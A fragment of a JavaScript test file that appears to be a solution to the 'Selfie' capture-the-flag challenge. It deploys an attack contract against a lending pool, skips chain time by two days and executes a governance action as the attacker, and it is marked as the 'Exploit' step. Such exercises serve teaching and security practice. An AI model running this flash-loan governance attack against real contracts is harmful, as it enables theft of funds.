...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackContract = await AttackSelfieFactory.deploy(attacker.address, this.pool.address, this.token.address);

        await attackContract.attack(TOKENS_IN_POOL);
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        const governanceContract = await this.governance.connect(attacker);
        await governanceContract.executeAction(1);
